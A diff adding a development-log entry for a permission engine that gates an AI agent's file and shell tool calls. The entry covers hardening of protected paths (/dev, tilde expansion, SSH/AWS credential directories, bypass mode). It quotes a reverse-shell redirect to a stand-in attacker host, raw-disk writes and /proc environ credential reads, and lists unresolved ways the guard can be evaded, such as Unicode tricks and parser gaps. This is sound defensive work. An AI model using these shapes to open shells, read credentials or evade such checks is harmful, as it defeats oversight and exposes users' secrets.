@@ -15,6 +15,66 @@ Format:
 
 ---
 
+## [2026-05-12] permission-engine-v2 — slice 97: §11 protected paths hardening (R2 /dev + cred dirs + tilde, R1 #4 bypass closure)
+
+**Done.** Ninety-seventh slice. Closes four protected-path P0/P1 findings from REVIEW_NOTES.md in one coordinated cut:
+
+- **R2 #12 (P0)**: `/dev` was absent from `SYSTEM_DENY_ROOTS`. `write_file('/dev/sda')` would overwrite a raw disk; `cat /dev/tcp/attacker/80 > shell` is the canonical reverse-shell-via-redirect shape. Kernel-managed pseudofs joins `/proc`, `/sys`, `/boot` in the deny tier.
+- **R2 P0 tilde finding**: model-emitted `'~/.ssh/id_rsa'` resolved to a literal `<cwd>/~/.ssh/id_rsa` because `path.resolve(cwd, ...)` doesn't expand `~`. Shells DO expand `~` on execution, so the resolver view diverged from the runtime view — a tilde-rooted protected_paths rule could never match because the lexical scope no longer mentioned HOME. Both fs and bash resolvers now expand `~` and `~/<rest>` before `path.resolve`.
+- **R2 P1 cred surfaces**: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube` join `TILDE_ESCALATE_DIRS`; `~/.netrc`, `~/.npmrc` join `TILDE_ESCALATE_FILES`. Writes to credential trees escalate to confirm; reads pass through (operators legitimately enumerate `~/.kube/config` to know which cluster they're targeting).
+- **R1 #4 (P0)**: `mode: bypass` short-circuited the rule pipeline AND bypassed §11. Spec §11 declares protected paths as HARDCODED, not flexible-via-policy — and bypass is a policy mode. The engine now walks the resolved capability set BEFORE returning the bypass-allow: a `deny` tier hit refuses outright with `section='protected'`; an `escalate` tier hit on a write op upgrades the bypass to confirm. Reads of escalate-tier paths still pass through (bypass is still bypass for the routine surface; only §11's hardcoded list trumps it).
+
+### Why this matters
+
+Three of these are silent bypass vectors. Tilde was the worst: a `~/.ssh/id_rsa` read silently became `<cwd>/~/.ssh/id_rsa` in the capability scope, sailed past every tilde-rooted protected rule, then the shell expanded `~` on execution and read the real key. The engine view and the runtime view were perfectly out of sync. Slice 97 collapses that gap.
+
+`/dev` was a clean omission — the SYSTEM_DENY_ROOTS list was authored against `/proc`, `/sys`, `/boot` and `/dev` was just forgotten. The fix is a one-element addition with broad impact: closes raw-disk writes, kernel debug interface (`/dev/kmem`), and the bash-only TCP-redirect reverse-shell vector (`/dev/tcp/<host>/<port>`).
+
+Bypass mode is the most subtle. The pre-slice semantics — "mode=bypass returns allow on EVERYTHING" — gave operators an emergency override but punched a hole through §11 that the spec explicitly says cannot exist. Slice 97 narrows the override: bypass still bypasses POLICY (deny / confirm / allow rules), but it does NOT bypass the hardcoded §11 list. An operator who explicitly chose `mode: bypass` for productivity reasons still gets the rare-but-load-bearing protected-path UX on `/proc` and credential writes.
+
+### Surface
+
+| File | Change |
+|---|---|
+| `src/permissions/protected_paths.ts` | `SYSTEM_DENY_ROOTS` gains `/dev`. `TILDE_ESCALATE_FILES` gains `.netrc`, `.npmrc`. `TILDE_ESCALATE_DIRS` gains `.ssh`, `.aws`, `.gnupg`, `.kube`. Each addition documented with the threat shape it closes. |
+| `src/permissions/resolvers/fs.ts` | New `expandTilde(path, home)` helper. `resolveAbs` calls it before `path.resolve(cwd, ...)`. Handles bare `'~'` and `'~/<rest>'`; `'~user/...'` stays literal (other-user expansion is not safely resolvable without OS calls and is far more often an attack signal than a legitimate operator alias). |
+| `src/permissions/resolvers/bash.ts` | Same `expandTilde` helper applied in `resolveArg` for symmetry — `cat ~/.ssh/known_hosts` now resolves under HOME, not under cwd. |
+| `src/permissions/engine.ts` | Imports `ProtectedOp` alongside `ProtectedTier`. In the `mode === 'bypass'` branch, walks `resolvedCapabilities` BEFORE building the bypass-allow: each fs-kind cap is classified via `classifyProtectedPath`. First `deny` tier short-circuits with `section='protected'`; the first `escalate` tier on a write is remembered and upgrades the bypass-allow to a `confirm` (deny still wins if a later cap classifies that way). Both deny and escalate decisions carry honest reason strings ("bypass mode does NOT override §11" / "bypass mode still escalates §11 protected paths") so audit triage is self-explanatory. |
+| `tests/permissions/protected_paths.test.ts` | systemDeny assertion updated to include `/dev`. New describe `slice 97 additions (R2 P0/P1)` with 10 tests covering /dev read+write, segment-boundary safety (`/devfoo` is not under /dev), and each new cred dir/file. |
+| `tests/permissions/resolvers.test.ts` | New describe `tilde expansion (slice 97, R2 P0)` with 6 tests: `~/.ssh/id_rsa` reads from HOME, bare `~` → HOME, write_file with `~/.aws/credentials`, bash `cat ~/.ssh/known_hosts`, `~root/...` stays literal, embedded `src/~/foo.ts` stays literal. |
+| `tests/permissions/engine.test.ts` | 7 new bypass + §11 tests covering deny tier (/proc/sysrq-trigger write + read, /dev/sda write), escalate tier (/etc/hosts write upgrades to confirm, ~/.ssh/authorized_keys write upgrades, /etc/hosts read passes through), and a routine non-protected path under bypass to verify no regression. |
+
+### Decisions
+
+- **`~user/...` stays literal.** Resolving another user's home requires either an OS call (`/etc/passwd` lookup) or hardcoded heuristics, both of which break on customized passwd layouts (LDAP, AD-bound). An LLM emitting `~root/...` is much more often an attack signal than a legitimate operator alias; landing on a literal `<cwd>/~root/...` surface that downstream policy will deny is the safer fail-open semantics here.
+- **`~` expansion only at word-start.** Shells only expand `~` when it appears at the start of a word (or after `:` in PATH-like values). `src/~/foo` is NOT a tilde reference. The resolver matches that contract: expansion fires for bare `~` and `'~/<rest>'` only.
+- **`.netrc` / `.npmrc` in the FILE list, not the DIR list.** Both are conventional single files at HOME (no `.netrc/` directory). The file list does exact-path equality; if a future tool created `.netrc.bak` the file list would miss it but the operator's policy could still cover it via a normal rule.
+- **Escalate tier UPGRADES bypass to confirm, deny tier REFUSES.** Spec §11 says reads of escalate-tier paths pass through (operators legitimately read `.bashrc` or `/etc/hosts`); only writes/deletes escalate. The bypass walk respects that asymmetry: read+escalate is a no-op, write+escalate becomes confirm. Deny tier applies to both reads AND writes (system pseudofs reads can leak — `/proc/<pid>/environ` enumeration is a known credential-exfil shape) and short-circuits as deny.
+- **Deny tier short-circuits, escalate tier accumulates.** A single deny-tier capability is sufficient to refuse the whole call (no later capability can rescue it). Escalate-tier hits remember the FIRST target for the confirm prompt but keep scanning — if a later cap classifies as deny, deny wins over escalate. This mirrors the standard precedence in `checkPath`.
+- **Test for bash bypass + protected dropped.** Initial scope included `bash command="cat /dev/kmem"` under bypass, but the bash AST resolver already refuses that pattern with its own conservative-resolver logic — the deny arrives via `section='resolver-refuse'`, NOT via the new bypass §11 walk. The test was exercising the wrong layer. Removed; the write_file `/dev/sda` test covers the fs-side §11 path under bypass.
+
+### Verification
+
+- `bun run typecheck` — clean
+- `bun run lint` — 0 errors, 2 pre-existing warnings (unchanged)
+- `bun test` — **6149 pass / 10 skip / 0 fail** (6159 total across 289 files); +23 tests on top of slice 96's 6126
+- Targeted: `bun test tests/permissions/protected_paths.test.ts tests/permissions/resolvers.test.ts tests/permissions/engine.test.ts` — 313/313
+
+### Next
+
+R2 P0/P1 remaining (deferred):
+- Bash AST resolver findings: literal-text Unicode bypass (`；` fullwidth, zero-width joiners, RTL override), `walkAst` recursion depth limit, COMMAND_TABLE gaps (tar/tee/ssh/scp/rsync/make/cargo), `cmdCurlWget` missing `-o` write detection, redirect $() recursion. These are bash-parser-side hardening and constitute their own slice.
+- R4 sandbox `hide_paths` / `scrub_env` (linked spec §9): neither runner implements them; `home-rw` profile exposes `~/.ssh`, `~/.aws`, etc. inside the sandbox. Slice 97 closes the engine-side classification; the runtime exposure stays open until the runner side lands. Substantial scope across `sandbox-runner.ts` (Linux/bwrap) and `sandbox-runner-macos.ts`.
+
+Remaining roadmap from REVIEW_NOTES.md (unchanged):
+- Bootstrap/policy parsing hardening (R6).
+- Sandbox wire validation (R8).
+- Broker drain caps (R9).
+- Audit chain atomicity (R5).
+- Telemetry scrubbing (R10).
+
+---
+
 ## [2026-05-12] permission-engine-v2 — slice 96: §17 replay reproducibility (R11 #34 + R12 #52 — `--against-archived-policy` + deny/confirm fixtures)
 
 **Done.** Ninety-sixth slice. Closes the two replay-side P0s from REVIEW_NOTES.md: (a) **R12 #52** — `§23 "Replay funcional pra todas categorias"` was marked `[x]` but every existing replay test seeded `decision: 'allow'` exclusively, with zero coverage for `deny` or `confirm` outcomes; (b) **R11 #34** — `policy_archive` was populated at every engine bootstrap but never consulted by replay, so even "deterministic" mode (`--against-current-policy`) compared the row against whatever policy is active NOW, not the bytes the row was actually decided under.
